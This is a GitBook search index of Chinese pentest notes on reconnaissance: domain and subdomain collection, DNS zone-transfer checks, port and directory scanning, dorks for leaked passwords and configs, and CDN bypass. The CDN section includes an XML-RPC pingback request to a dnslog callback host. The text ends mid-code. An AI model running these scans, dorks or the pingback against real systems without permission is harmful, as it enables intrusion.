{"./":{"url":"./","title":"Introduction","keywords":"","body":"关于我 id value name aaron email aaronluo54@gmail.com location Chengdu,Sichuan / Beijing 想说的话 非常感谢本科的@huyaocode同学，同意让我复制前端基础的所有内容🚬 部分文章上了🔒，不过我相信作为安全大牛逼的你们一定是能破解的 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-12-18 12:46:15 "},"知识库/01.WEB安全/00.信息收集/1.资产收集/1.信息收集之主域名收集.html":{"url":"知识库/01.WEB安全/00.信息收集/1.资产收集/1.信息收集之主域名收集.html","title":"1.信息收集之主域名收集","keywords":"","body":"信息收集之主域名收集方法 ICP备案查询 什么是ICP备案 ICP备案是指网站在信息产业部提交网站信息进行官方认可。对国内各大小网站(包括企业及个人站点)的严格审查工作，对于没有合法备案的非经营性网站或没有取得ICP许可证的经营性网站， 根据网站性质，将予以罚款，严重的关闭网站，以此规范网络安全，打击一切利用网络资源进行不法活动的犯罪行为。也就是说，只要是盈利为目的的网站，都要进行ICP备案，否则会受到相应的处罚。 国内使用国内服务器的网站，都必须要先办理ICP备案后才可以上线。 有何作用 通过查询目标企业的备案信息，可直接获取到目标企业注册了哪些域名，从而增加可渗透的目标范围。 如何查询 推荐使用官方网站ICP/IP地址/域名信息备案管理系统 支持使用单位名称、域名和备案号进行查询 使用单位名称查询 使用域名查询 使用备案号查询 使用任意参数查询后，可通过相关的信息查询其他相关的域名达到收集目标域名的目的。 第三方查询网站 ICP备案查询 - 站长工具 站长seo综合查询工具-爱站网 WHOIS查询 什么是WHOIS WHOIS是用来查询互联网中域名的IP以及所有者等信息的传输协议。早期的WHOIS查询多以命令行接口存在，但是现在出现了一些基于网页接口的简化在线查询工具，甚至可以一次向不同的数据库查询。网页接口的查询工具仍然依赖WHOIS协议向服务器发送查询请求，命令行接口的工具仍然被系统管理员广泛使用。 有何作用 通过查询目标的WHOIS信息，对联系人、联系邮箱等信息进行反查，获取更多相关的域名信息。 重点关注注册商、注册人、邮件、DNS解析服务器、注册人联系电话。 如何查询 Linux本地WHOIS查询 在线查询网站 域名Whois查询 - 站长之家 站长工具whois查询工具爱站网 国家域名whois 全球 WHOIS 查询 域名信息查询 - 腾讯云 whois查询-中国万网 在线查询演示 此处以站长之家查询为例，输入域名即可进行查询 点击联系人后方的“whois反查”进行联系人反查 点击联系邮箱后方的“whois反查”进行邮箱反查 证书查询 什么是证书 SSL证书是一种遵守SSL协议的服务器数字证书，由受信任的根证书颁发机构颁发。 SSL证书采用SSL协议进行通信，SSL证书部署到服务器后，服务器端的访问将启用HTTPS协议。 您的网站将会通过HTTPS加密协议来传输数据，可帮助服务器端和客户端之间建立加密链接，从而保证数据传输的安全。 有何作用 通过查询共用SSL证书的网站，可以找到相关的其他域名。 如何查询 此处推荐2种方法。 浏览器直接查看 点击更多信息 选择“安全-->查看证书” 可以看到很多的主域名 通过在线网站 推荐使用 crt.sh 输入域名即可查询 DNS共享记录查询 什么是DNS DNS（Domain Name Server，域名服务器）是进行域名(domain name)和与之相对应的IP地址 (IP address)转换的服务器。DNS中保存了一张域名(domain name)和与之相对应的IP地址 (IP address)的表，以解析消息的域名。 域名是Internet上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位（有时也指地理位置）。域名是由一串用点分隔的名字组成的，通常包含组织名，而且始终包括两到三个字母的后缀，以指明组织的类型或该域所在的国家或地区。 有何作用 此处通过查询共享DNS服务器的主机来获取到相关的域名； 需要注意的是，如果是公开的DNS服务器，那么查询的效果将会特别差。 如何查询 首先查询目标是否存在自建的NS服务器 将获取到的NS服务器带入 https://hackertarget.com/find-shared-dns-servers/ 进行查询 此处查询的结果并不全是属于目标范围，需要进一步的确认和观察。 IP反查 有何作用 目标多个域名可能绑定在同一IP上，通过IP反查一定情况下可获取到其他的域名信息。 如何查询 同IP网站查询，同服务器网站查询 - 站长工具 Online investigation tool - Reverse IP, NS, MX, WHOIS and Search Tools 输入相关的域名或IP地址即可查询。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-26 20:24:22 "},"知识库/01.WEB安全/00.信息收集/1.资产收集/2.信息收集之子域名收集.html":{"url":"知识库/01.WEB安全/00.信息收集/1.资产收集/2.信息收集之子域名收集.html","title":"2.信息收集之子域名收集","keywords":"","body":"信息收集之子域名收集 上一次我们分享了主域名收集的思路和方法，但除了主域名外，子域名也是域名信息收集中的一个重要环节，在当今各种防护设备满天飞的情况下，想要拿下主域名越来越难，但我们可以使用迂回策略，从子域名下手，慢慢靠近主域名以达到shell的目的。 子域名收集可以帮助我们发现目标对外开放的更多的资产，如果能找到一些被遗忘或目标不关注的子域名，将其作为突破点，可能达到事半功倍的效果。 子域名收集的方式很多，但如何尽可能全的收集到所有的子域名却不是那么容易的事儿；本次将从手工和工具两种方式为大家进行讲解。 手工操作 证书透明度收集子域 介绍 要向用户提供加密流量，网站必须先向可信的证书授权中心 (CA) 申请证书。然后，当用户尝试访问相应网站时，此证书即会被提供给浏览器以验证该网站。近年来，由于 HTTPS 证书系统存在结构性缺陷，证书以及签发证书的 CA 很容易遭到入侵和操纵。Google 的证书透明度项目旨在通过提供一个用于监测和审核 HTTPS 证书的开放式框架，来保障证书签发流程安全无虞。 收集方法 可以通过以下链接进行在线查询： crtsh entrust censys google spyse certspotter（每小时免费查询100次） facebook（需要登录） 输入域名，即可查询 DNS域传送 介绍 DNS服务器分为主服务器，备份服务器，缓存服务器。 域传送是指备份服务器从主服务器上复制数据，然后更新自身的数据库，以达到数据同步的目的，这样是为了增加冗余，一旦主服务器出现问题可直接让备份服务器做好支撑工作。 而域传送漏洞则是由于DNS配置不当，导致匿名用户可以获取某个域的所有记录，造成整个网络的拓扑结构泄露给潜在的攻击者，凭借这份网络蓝图，攻击者可以节省大量的扫描时间，同时提升了目标的准确度。 检测方法 nslookup # 查询nameserver nslookup -type=ns knownsec.com 119.29.29.29 # 指定nameserver，列举域名信息 nslookup server f1g1ns1.dnspod.net ls knownsec.com 如果提示无法列出域，那就说明此域名不存在域传送漏洞。 dig axfr 是q-type类型的一种，axfr类型是Authoritative Transfer的缩写，指请求传送某个区域的全部记录。 我们只要欺骗dns服务器发送一个axfr请求过去，如果该dns服务器上存在该漏洞，就会返回所有的解析记录值 # 找到NS服务器 dig knownsec.com ns # 发送axfr请求 dig axfr @f1g1ns2.dnspod.net knownsec.com nmap nmap的脚本dns-zone-transfer可以帮我们探测是否存在域传送漏洞 nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=knownsec.com -p 53 -Pn f1g1ns1.dnspod.net DNS公开数据集 介绍 Rapid7的开源数据项目收集了多种全互联网范围内的扫描数据，任何人都可下载这些数据，而本次主题中主要涉及两个数据集，分别是FDNS和RDNS，可从中获取到大量的子域名信息。 收集方法 Find DNS Host Records (Subdomains) netcraft 搜索引擎 介绍 搜索引擎通过对互联网进行大量爬行后，往往收集了大量的子域名，只需要输入对应的语法，就可以从搜索引擎的数据库中查询到我们想要的内容。 收集方法 普通搜索引擎 此处以Google为例，使用减号来排除不想收集到的子域名 site:knownsec.com -www 空间搜索引擎 此处以zoomeye为例 https://www.zoomeye.org/searchResult?q=site%3A%20knownsec.com site: knownsec.com 信息泄露 网站爬虫 很多网站的页面中，会有跳转到其他系统的功能，如OA、邮箱系统等，其中可能就包含有其他子域名相关的信息，此外部署了内容安全策略（CSP）的网站在header头Content-Security-Policy中，也可能存在域名的信息。可使用burpsuite或者awvs类工具对站点进行爬取分析。 文件泄漏 很多网站有跨域策略文件crossdomain.xml、站点地图sitemap.xml和robots.txt等，其中也可能存在子域名的信息。 GitHub 在GitHub中直接搜索域名关键词，除了可以发现敏感的泄漏信息外，也可以发现部分子域名信息。 第三方在线平台 介绍 通过第三方在线平台提供的一些服务，可以快速发现部分子域名。 使用各种搜索引擎搜索关键词 “在线子域名查询” 即可快速寻找到一些直接可用的在线平台 收集方法 Find DNS Host Records | Subdomain Finder | HackerTarget.com DNSdumpster.com - dns recon and research, find and lookup dns records virustotal 域名查iP 域名解析 iP查询网站 iP反查域名 iP反查网站 同一iP网站 同iP网站域名iP查询 threatminer Subdomain Finder threatbook（需要高级权限） 子域名查询 - 站长工具（需要登录） 子域名枚举爆破 介绍 所谓子域名枚举爆破，就是通过不断的拼接字典中的子域名前缀去枚举域名的A记录，如knownsec.com拼接前缀test组合成test.knownsec.com，再对其进行验证，但是该方法一般需要解决泛解析问题。 收集方法 获取一些常见子域名前缀后，整理成字典，依次拼接主域名在浏览器进行访问验证即可，或通过nslookup进行验证即可。 工具自动化 通过前面手工部分的讲解，可以看到大多收集步骤均为重复性的工作，那如果把所有的手工操作都自动化结合成一个工具，那么肯定能够达到事半功倍的效果。 OneForAll https://github.com/shmilylty/OneForAll 解决大多传统子域名收集工具不够强大、不够友好、缺少维护和效率问题的痛点，是一款集百家之长，功能强大的全面快速子域收集终极神器。 ksubdomain https://github.com/knownsec/ksubdomain ksubdomain是一款基于无状态子域名爆破工具，支持在Windows/Linux/Mac上使用，它会很快的进行DNS爆破，在Mac和Windows上理论最大发包速度在30w/s,linux上为160w/s的速度。 Layer子域名挖掘机 https://github.com/euphrat1ca/LayerDomainFinder Layer子域名挖掘机是一款子域名收集工具，拥有简洁的界面和简单的操作模式，支持服务接口查询和暴力枚举获取子域名信息，同时可以通过已获取的域名进行递归爆破。 参考链接 红蓝对抗之域名搜集方法总结 子域名收集笔记 从代码角度看各类子域名收集工具 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-12 21:42:06 "},"知识库/01.WEB安全/00.信息收集/1.资产收集/3.信息收集之其他信息收集.html":{"url":"知识库/01.WEB安全/00.信息收集/1.资产收集/3.信息收集之其他信息收集.html","title":"3.信息收集之其他信息收集","keywords":"","body":"信息收集之其他信息收集 之前我们分享了域名收集的思路和方法、信息搜集中还有诸如C段资产、端口搜集、APP搜集、小程序、公众号收集。都是获取目标有效信息的方法。本次将从以下这些方法为大家讲解。 段资产收集 网络空间搜索引擎 通过第三方搜索引擎搜索目标IP以及C段资产，来找到目标资产的IP地址 使用如下关键词来找到目标资产的IP地址 title:\"知道创宇\" +country:\"CN\" -subdivisions:\"香港\" 根据网站的ico进行搜索 iconhash:\"3ae0b66d54edf1518e9111de361fdbba\" 可以根据已知网站中的一些标识来使用body搜索，如邮箱、备案号等等 body:\"知道创宇\" 根据搜集到的IP地址进行C段查询 cidr:\"1.2.3.4/24\" 列举一些常用的搜索引擎 Zomeye Fofa 360quake shodan C段扫描工具 除了通过网络空间搜索引擎来搜索目标的C段资产，还可以通过一些工具进行资产搜索 GobyGoby的优势是方便直观，且支持POC进行漏洞扫描，可自定义POC shuize python3 ShuiZe.py -c 192.168.1.0,192.168.2.0,192.168.3.0 水泽自带资产探活、支持漏洞验证、Host碰撞 fscan fscan.exe -h ip/24 扫描速度快，支持漏洞验证 ALLin python AlliN.py --host 10.1.1.1/24 -p 80 -m pscan 一款红队信息搜集工具，被动识别访问站点是否是云上站点 端口信息搜集 既然已经有了C段的资产，那么针对网站这里，IP开放的端口也是必须要整起来的。 御剑端口扫描 fscanfscan.exe -h 192.168.1.1 -p 1-65535 Nmap nmap的使用方法就不用多说了，是一款一直都在用的工具、该工具扫描速度较慢 Msscan 扫描速度虽然快，但是精准度不够 masscan -p80,8000-8100 10.0.0.0/8 --rate=10000 存活资产探测 C段+全段口会生成很多资产，但是其中会有不能访问的，所以我们需要资产探活 ehole使用方法就是，直接加IP地址段或者域名列表 EHole -l url.txt Fingerpython3 Finger.py -h test404 敏感信息搜集 在获取了目标资产，就是对目标网站的敏感信息搜集，诸如泄露的账号和路径等等目录扫描 在目标资产收集完毕后，可以都某些服务进行目录扫描，可能会存在敏感信息 dirsearchpython3 dirsearch.py -u url -e * dirbkali自带扫描工具，dirb的字典还是不错的 御剑 windows下的图形化工具，显示方便 JS信息搜集 在JS中可能会存在某些服务的接口，测试这些接口是否有未授权等、或者也会存在一些子域名，或者测试域名在其中，或者诸如用户密码等敏感信息 可以全局搜索http、\"/、这种关键词 JSfinder jsfinder可以匹配网站Js中的接口和地址 Haeburp中的插件，可以自定义正则来匹配敏感信息、比如匹配手机号等、有时js会泄露测试账号、配置等 GitHub信息搜集 github作为全球的开发使用网站、有些开发会在上面发布公司测试的代码、或者一些测试，利用github搜索关键词，或者结合特定语法来使用，效果更佳site:Github.com inurl:sql site:Github.com svn username password 等等 网盘信息搜集 某些人员可能上传资料到一些网盘中，没有加密码、或者密码泄露、导致信息被泄露。https://www.feifeipan.com/ 谷歌信息搜集 利用谷歌语法进行敏感信息搜集site:xxx.com filetype:doc intext:pass site:xxx.com filetype:xls intext:pass site:xxx.com filetype:conf site:xxx.com filetype:inc filetype:log iserror.log 公众号、小程序搜集 在web资产有限的情况下，可以通过公众号来进行渗透。也可以获取冷门资产。 利用企查查搜索公众号 搜索相应公司，点击其知识产权 搜狗搜索 直接在微信上搜索相应公众号名字、小程序APP信息搜集 七麦APP搜索 直接搜索公司名字、或者搜索开发者名字 豌豆荚 爱应用 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-12 21:42:09 "},"知识库/01.WEB安全/00.信息收集/2.绕过CDN寻找真实IP/":{"url":"知识库/01.WEB安全/00.信息收集/2.绕过CDN寻找真实IP/","title":"2.绕过CDN寻找真实IP","keywords":"","body":"绕过CDN寻找到真实IP为核心精简版 CDN 2021 完全攻击指南（一）和CDN 2021 完全攻击指南（二）可以说非常经典和全面了，就直接copy过来了 大家可以对照查看 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-12 21:42:27 "},"知识库/01.WEB安全/00.信息收集/2.绕过CDN寻找真实IP/1.绕过CDN寻找真实IP.html":{"url":"知识库/01.WEB安全/00.信息收集/2.绕过CDN寻找真实IP/1.绕过CDN寻找真实IP.html","title":"1.绕过CDN寻找真实IP","keywords":"","body":"判断是否存在CDN 多地ping 如果没有使用CDN，则只会显示一个IP地址。 可以使用以下站点进行多地ping， http://ping.chinaz.com/ https://ping.aizhan.com/ http://www.webkaka.com/Ping.aspx https://www.host-tracker.com/v3/check/ 如图则不存在CDN nslookup法 用国外的dns服务器 如果返回域名解析对应多个 IP 地址多半是使用了 CDN nslookup -qt=A h5.hunbei.com 8.8.8.8 用国外的可能会得到真实IP 不存在： 存在： IP反查域名 查看是否存在大量不相关的IP https://securitytrails.com/ https://dns.aizhan.com/ https://x.threatbook.cn 如下图可以看出来是使用了CDN 观察header 观察请求响应的返回数据的头部，是否有 CDN 服务商标识 若 asp 或者 asp.net 网站返回头的 server 不是 IIS、而是 Nginx，则多半使用了nginx反向代理到 CDN 在线检测工具 https://www.cdnplanet.com/tools/cdnfinder/ https://tools.ipip.net/cdn.php https://whatsmycdn.com/ 寻找真实IP 网络空间测绘引擎 zoomeye、fofa等，搜索站点相关信息，有一定几率能够获取到站点的真实IP fofa shodan quake Censys.io 二级域名法 由于部分CDN价格昂贵，所以一些重要的站点会使用CDN加速，而一些子域名则没有使用，且极有可能和主站在同一C段，这时候，就可以通过发现目标的子域名，从而根据IP来定位主域名的IP地址。 oneforall ksubdomain Jsinfo-scan 邮箱 用目标邮件服务器发送邮件给自己(QQ邮箱)再查看邮件源码一定情况下可以找到真实IP（服务端和我们建立连接） 这里还有一个奇淫技巧，通过发送邮件给一个不存在的邮箱地址，比如 000xxx@domain.com ，因为该用户不存在，所以发送将失败，并且还会收到一个包含发送该电子邮件给你的服务器的真实 IP 通知。 RSS 订阅 邮箱注册、激活处 邮箱找回密码处 产品更新的邮件推送 某业务执行后发送的邮件通知 员工邮箱、邮件管理平台等入口处的忘记密码 海外ping 由于国内厂家可能只针对国内使用cdn，对海外没有铺设，导致通过通过海外的IP可以直接获取到真实IP。 可以使用： http://ping.chinaz.com/ https://asm.ca.com/zh_cn/ping.php http://host-tracker.com/ http://www.webpagetest.org/ https://dnscheck.pingdom.com/ 进行查询 DNS历史解析记录 https://dnsdb.io/zh-cn/ https://securitytrails.com/ https://x.threatbook.cn/ http://toolbar.netcraft.com/site_report?url= https://viewdns.info/iphistory/?domain= 以微步在线为例 找到站点 判断存在CDN 微步查询 确认为真实IP 这些很有可能就是在使用CDN之前留下的解析记录 SSL证书 在线 https://censys.io/certificates?q=parsed.names.raw%3A+%22baidu.cn%22+and+tags.raw%3A+trusted # 查询有效的证书 Certificates: parsed.names.raw: \"baidu.cn\" and tags.raw: trusted # 注意 # 测试过程中，很容易陷入思维误区，认为 有效 的证书才是我们需要的，但其实并不一定，很多服务器配置错误依然保留的是 无效 的证书 sha1 签名反查IPV4 https://crt.sh/ 命令行工具 openssl openssl s_client -connect hao123.com:443 | grep subject curl curl -v https://hao123.com | grep 'subject' 敏感文件泄漏 服务器日志文件 探针文件，例如 phpinfo 网站备份压缩文件 .DS_Store .hg .git SVN Web.xml 历史域名 很多网站在发展的过程中，会更换域名，比如京东以前的域名是 360buy.com ，后来斥巨资购买了 jd.com 。 网站在更换新域名时，如果将 CDN 部署到新的域名上，而之前的域名由于没过期，可能未使用 CDN，因此可以直接获得服务器 IP，所以，历史域名也是一个很重要的点。 通过 XML-RPC PINGBACK 通信 XML-RPC 是支持 WordPress 与其他系统之间通信的规范，它通过使用 HTTP 作为传输机制和 XML 作为编码机制来标准化这些通信过程。 在 WordPress 的早期版本中，默认情况下已关闭 XML-RPC，但是从3.5版本开始，默认情况下开启。 XML-RPC 支持 trackback 和 pingback。 虽然 WordPress 启用了 REST API 来代替 XML-RPC ，不过 XML-RPX 不会过时的，放心大胆的使用就好，虽然 XML-RPC 这个技术很老了，但依然可以通杀很多网站。 POST /xmlrpc.php HTTP/1.1 Host: domain.com Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: en,zh-CN;q=0.9,zh;q=0.8 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 323 pingback.ping http://2vbis4.dnslog.cn https://domain.com/ APP 目标若存在APP，则APP可能通过IP直接与服务端进行通信，若最新版采用域名通信，也可尝试寻找历史版本进行分析。 历史版本宝贝一般很多 漏洞 如果目标网站本身存在漏洞的话，比如 SSRF、XXE、XSS、文件上传、命令执行等漏洞，或者我们找到的其他突破口，注入我们自己的带外服务器地址，然后在服务器上检查 HTTP 日志记录。 应用本身的错误会造成当传递一些错误的参数值或者错误的地址时，内部会抛出异常，也就是日常所说的报错，关注报错点，经常会泄露一些真实的 IP 地址或者内网 IP 段。 通过 virtual-host 碰撞 当我们收集了目标足够多的可能的真实 IP 时，可以通过 IP 和子域的碰撞，来批量获得命中目标以及目标哪些的子域。 在线收集工具 https://pentest-tools.com/information-gathering/find-virtual-hosts# 通过 favicon.ico 哈希特征 favicon.ico 是现代浏览器在网页标题的左侧显示的一个小图标。 该图标数据通常是从 https://anywebsite/favicon.ico 处获取的，浏览器会在浏览任何网站时自动请求它。 因为可以通过计算 favicon.ico 的指纹哈希，然后去 shodan 等搜索引擎搜索与之相同的主机结果，从而进一步探测是否能挖掘出目标网站的真实 IP 地址。 目前网络空间搜索引擎均支持 通过网页源码特征值 在服务器源 IP 地址允许访问并且返回的也是类似的网站内容情况下，可以通过侦察页面源码中 JS 、CSS 、HTML 等一系列静态特征值，然后用 Shodan 、Zoomeye 、Censys 等搜索引擎进行匹配搜索，从而定位 IP 。 通过域名备案信息广域探测（成功率高） 针对目标域名，目标二级域名，如果都做了 CDN 的情况下，是不是就思路中断了呢？ 肯定不是。这里分享一个很少有人去关注的独门秘技。 网站需要服务器，但是再土豪的公司，也不可能一个域名一台服务器，大多数情况下，都是多个域名业务，共用一台服务器。 那么如果目标网站存在备案，可以查询其备案信息，收集该单位或者个人备案的其他网站域名以及其他子域，然后再进行一轮广域的探测，很有可能其中的某个边缘子域，没有做 CDN，就直接暴露了真实服务器的 IP 地址，然后再进一步验证该 IP 是否也是目标网站的真实 IP 。 找到真实 IP 后如何使用 在获取到真实IP后，通过直接访问IP可能无法访问，那么此时提供2种思路进行解决 通过修改 hosts 文件，将域名和 IP 绑定。（要是不会，不建议阅读此文。） 如使用 burpsuite 测试，可以在 Project options ----> Connections ----> Hostname Resolution 中增加域名和 IP 记录。 参考 https://github.com/bin-maker/2021CDN/blob/main/CDN%202021%20%E5%AE%8C%E5%85%A8%E6%94%BB%E5%87%BB%E6%8C%87%E5%8D%97%EF%BC%88%E4%B8%80%EF%BC%89.md https://www.anquanke.com/post/id/227818 https://www.anquanke.com/post/id/231437 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-12 21:42:32 "},"知识库/01.WEB安全/00.信息收集/2.绕过CDN寻找真实IP/2.CDN_2021_完全攻击指南_1.html":{"url":"知识库/01.WEB安全/00.信息收集/2.绕过CDN寻找真实IP/2.CDN_2021_完全攻击指南_1.html","title":"2.CDN2021完全攻击指南_1","keywords":"","body":"CDN 2021 完全攻击指南 （一） 安全客首发：https://www.anquanke.com/post/id/227818 这是一篇全网（无论国内还是国外）最全、最详细、最新、最实用的关于 CDN 网络对抗攻击的文章，渗透测试中若碰到 CDN 类的问题，只需要看这一篇指南即可。我也会在 Github 长期保持此文的更新，更新与修正新的对抗技术、工具和网站。 Content Delivery Network，中文全称为内容分发网络，简称为 CDN 。 使用 CDN 技术可以有效的提高网站的访问速度和安全性，因此目前互联网上，超过 50％ 的 Alexa 前 1000 网站和超过 35％ 的 Alexa 前 10000 的网站都部署在 CDN 网络后面，所有请求网站内容的用户都将从最近的 CDN 代理服务器获取其缓存版本，因此内容加载速度更快，网站的性能得到改善。 具体 CDN 的相关原理网上都有阐述，有兴趣的读者可以去自行了解，本篇指南旨在攻击，追求简洁、高效、实用，就不再多赘述一些概念性相关的东西了。 常见 CDN 服务商 一、国内 CDN 服务商 阿里云 CDN 百度云 CDN 七牛云 CDN 又拍云 CDN 腾讯云 CDN Ucloud 360 CDN 网宿科技 ChinaCache 帝联科技 二、国外 CDN 服务商 CloudFlare StackPath Fastly Akamai CloudFront Edgecast CDNetworks Google Cloud CDN CacheFly Keycdn Udomain CDN77 判断网站是否使用了CDN 反查域名 IP，看结果是否有大量不相关的域名存在 观察请求响应的返回数据的头部，是否有 CDN 服务商标识 使用超级 ping，通过不同定位地点的 ping 测试，看返回的 IP 是否不同 判断 IP 是否在常见 CDN 服务商的服务器 IP 段上 若 asp 或者 asp.net 网站返回头的 server 不是 IIS、而是 Nginx，则多半使用了nginx反向代理到 CDN 利用 Nslookup 查询域名，看是否返回多个应答 IP 如何绕过 CDN 朔源网站真实 IP 一、通过查询 DNS 记录 / IP 历史记录 / 子域名 等数据记录 很多网站只给关键的域名或者主域名做了 CDN，其下很多子域名没有使用 CDN 服务，所以我们可以通过查询目标网站的根域名、二级域名、三级域名甚至多级子域名来获得真实IP。不过有时候查出来的并不是真实 IP，可能仅仅做了 A 记录 ，这种情况下可以继续扫描同 C 段的 IP 和端口，然后逐个探测是否为目标网站。 在网站使用 CDN 服务之前，解析的是真实IP，所以可以查询 DNS 历史记录，看是否能探测到使用 CDN 之前的 IP 。 DNS 解析记录中重点关注 TXT 记录和 SPF 记录，是否有泄露真实IP。 1、在线查询平台 1.SecurityTrails （https://securitytrails.com/） SecurityTrails（前身为 DNS Trails）拥有大约3.5万亿DNS记录，3亿whois记录，8亿SSL证书记录以及超过4.5亿子域的记录数据。自2008年以来，网站每天都收集和更新海量数据。 SecurityTrails 是我最常用的平台之一，免费、精准，数据量极其庞大，足够支撑日常。 DNS 记录： IP历史： 子域名： 2.Complete DNS（https://completedns.com/） Complete DNS 拥有超过 22 亿个DNS变更记录，提供API，支持同时进行多域名/IP查询。 3.WhoISrequest （https://whoisrequest.com/） WhoISrequest 这个网站自2002年以来一直在跟踪和记录DNS历史变更，数据底蕴很足。 这种时间线设计的UI风格很不戳，点赞。 4.Whoxy（https://www.whoxy.com/） Whoxy 拥有爬取超过 3.65亿个子域数据，该网站 API 调用非常方便，以 XML 和 JSON 格式返回数据。 5.微步Threatbook（https://x.threatbook.cn/） Threatbook 微步在线针对 IP、域名 进行综合查询威胁情报、历史记录、子域名解析、DNS解析等等信息，支持 API 查询，非常方便。 Netcraft（https://netcraft.com/） Netcraft 不用多说了吧，很多人都知道，不过仁者见仁智者见智吧，经过时代的变迁，Netcraft 也不是曾经的那个少年了，这里只是提一下，仅供参考。 Viewdns（https://viewdns.info/） Viewdns 可以说是非常的简洁直观了，就算你不懂任何英文，我相信你也看的懂，至少你知道在哪里输入对吧。响应速度也是非常快了，首页一目了然，集成了超多的查询功能。 找你需要的功能查询就好，用网站提供的 API 也可以 8.Whoisxmlapi（https://reverse-ip.whoisxmlapi.com/） Whoisxmlapi 数据库包含了超过1.4亿多个域名生态数据，用来反查 IP 和 DNS 数据，在绕过 CDN 时候做反向对比非常有用。网站和 whoxy 一样，也是以 XML 和 JSON 格式返回数据，支持自定义。 Dnsdb（https://dnsdb.io/） Dnsdb 功能非常强大，老平台了，也是我常用平台之一。 搜索前可以先简单学习一下搜索语法： 觉得难？不想学？那也没关系，站长已经考虑到你这种懒人情况了，首页就有给懒人准备的搜索构造器，十分友好： 10.SubDomainTools（https://ruo.me/sub） 在线子域名查询，支持实时模式和后台模式，不阻塞前端线程，不占CPU，小测试的时候非常方便。 2、IOT 物联网络空间测绘搜索引擎 1.Censys（https://censys.io/） Censys 可帮助安全从业人员发现可从Internet访问的设备，包括 IP 地址、开放端口、物理定位、域名信息、托管服务商、SSL 证书 等等数据，从中发现需要的信息追踪到网站真实的 IP 地址。 2.FOFA（https://fofa.so/） FOFA 可以迅速进行网站资产匹配，加快后续工作进程，如漏洞影响范围分析，应用分布统计，应用流行度排名统计等。FOFA 非常友好，即使免费，也可以查询足够多的数据量，只要你不是商用或者大需求用户，是不需要开会员的。 3.Shodan（https://www.shodan.io/） Shodan 被称为互联网上最强大的搜索引擎，主要是用来搜索网络空间中在线设备的，可以通过 Shodan 搜索指定的设备，或者搜索特定类型的设备，它可以帮助安全研究人员找到有关他们所研究目标的有用信息。 语法特别强大，建议搜索前好好浏览一下筛选器文档，可以达到事半功倍的效果。 4.Zoomeye Zoomeye，钟馗之眼，知道创宇打造的宇宙级网络空间搜索引擎，Shodan 侧重于主机设备，Zoomeye 则偏向于 Web 发现。 3、工具和脚本 1.SubDomainsBrute 项目地址：https://github.com/lijiejie/subDomainsBrute SubDomainsBrute 是通过纯 DNS 爆破来寻找子域名，为了最大提升脚本效率，采用协程+多进程的方式进行爆破。Python 3.5 以上需要安装 aiodns 库进行异步查询，python 2 需要安装 dnspython 库和 gevent 协程库。 之前是不支持扫描泛解析域名的，10月份作者更新已经支持泛解析，使用 -w 参数。 如图，我们针对一个泛解析的域名进行爆破，subDomainsBrute 会提示 any-sub 错误，之后使用 -w 参数开启泛解析强制爆破： 2.ESD 项目地址：https://github.com/FeeiCN/ESD 相比于的暴力收集手段，ESD 在很多方面有独特的想法。 基于RSC（响应相似度对比）技术对泛解析域名进行枚举。 基于aioHTTP获取一个不存在子域名的响应内容，并将其和字典子域名响应进行相似度比对，超过阈值则说明是同个页面，否则为可用子域名，并对最终子域名再次进行响应相似度对比。 基于AsyncIO异步协程技术对域名进行枚举。 基于AsyncIO+aioDNS将比传统多进程/多线程/gevent模式快50%以上。 解决各家DNS服务商对于网络线路出口判定不一致问题。 解决各家DNS服务商缓存时间不一致问题。 解决随机DNS问题。 根据网络情况自动剔除无效DNS，提高枚举成功率。 ESD 通过使用文本相似度，判断阈值的方法来过滤泛解析，这种方法现在看来很笨重，我们可以自己修改脚本，否则因此会导致机器的内存、CPU都负荷，对机器性能要求比较高，且不支持 python2。 python3 环境下通过 pip 直接安装： $ pip install esd 基本用法（项目官方给出）: # 扫描单个域名 esd -d qq.com # debug模式扫描单个域名 esd=debug esd -d qq.com # 扫描多个域名（英文逗号分隔） esd --domain qq.com,tencent.com # 扫描单个域名且过滤子域名中单个特定响应内容 esd --domain mogujie.com --filter 搜本店 # 扫描单个域名且过滤子域名中多个特定响应内容 esd --domain mogujie.com --filter 搜本店,收藏店铺 # 扫描文件（文件中每行一个域名） esd --file targets.txt # 跳过相似度对比（开启这个选项会把所有泛解析的域名都过滤掉） esd --domain qq.com --skip-rsc # 使用搜索引擎进行子域名搜索（支持baidu、google、bing、yahoo，使用英文逗号分隔） esd --domain qq.com --engines baidu,google,bing,yahoo # 平均分割字典，加快爆破 esd --domain qq.com --split 1/4 # 使用DNS域传送漏洞获取子域名 esd --domain qq.com --dns-transfer # 使用HTTPS证书透明度获取子域名 esd --domain qq.com --ca-info 但是实际上我们从源码出发，发现很多功能作者目前并未实现： parser = OptionParser('Usage: python ESD.py -d feei.cn -F response_filter -e baidu,google,bing,yahoo -p user:pass@host:port') parser.add_option('-d', '--domain', dest='domains', help='The domains that you want to enumerate') parser.add_option('-f', '--file', dest='input', help='Import domains from this file') parser.add_option('-F', '--filter', dest='filter', help='Response filter') parser.add_option('-s', '--skip-rsc', dest='skiprsc', help='Skip response similary compare', action='store_true', default=False) parser.add_option('-S', '--split', dest='split', help='Split the dict into several parts', default='1/1') parser.add_option('-p', '--proxy', dest='proxy', help='Use socks5 proxy to access Google and Yahoo') parser.add_option('-m', '--multi-resolve', dest='multiresolve', help='Use TXT, AAAA, MX, SOA record to find subdomains', action='store_true', default=False) parser.add_option('--skey', '--shodan-key', dest='shodankey', help='Define the api of shodan') parser.add_option('--fkey', '--fofa-key', dest='fofakey', help='Define the key of fofa') parser.add_option('--femail', '--fofa-email', dest='fofaemail', help='The email of your fofa account') parser.add_option('--zusername', 